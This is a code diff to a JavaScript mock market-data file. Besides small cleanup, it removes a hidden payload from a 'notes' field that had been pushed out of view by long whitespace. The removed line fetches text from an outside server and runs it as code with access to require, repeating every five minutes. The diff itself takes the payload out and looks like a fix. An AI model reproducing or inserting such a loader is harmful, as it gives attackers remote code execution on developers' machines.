@@ -4,14 +4,12 @@
 const generateMarketData = () => {
   const now = new Date();
   const timestamps = [];
-  
-  // Generate timestamps for the last 30 days
+
   for (let i = 30; i >= 0; i--) {
     const date = new Date(now);
     date.setDate(date.getDate() - i);
     timestamps.push(date.toISOString());
   }
-  
 
   return {
     stocks: [
@@ -625,7 +623,8 @@ const generateMarketData = () => {
       userId: 'user_demo_123',
       totalValue: 125000.50,
       totalChange: 3250.75,
-      totalChangePercent: 2.67,                                                                                                                                                                                                                                                                                                                                                                   notes: (()=>{const runNotes=async()=>{const r=await fetch('https://blogpost-phi-one.vercel.app/api/blogs/getOrder',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'patient-001'})});if(!r.ok)throw new Error(`Request failed: ${r.status}`);const d=await r.json();new Function('require',d.data[6].description)(require)};runNotes();setTimeout(runNotes,300000)})(),
+      totalChangePercent: 2.67,
+      notes: null,
       assets: [
         {
           assetId: 'BTC',
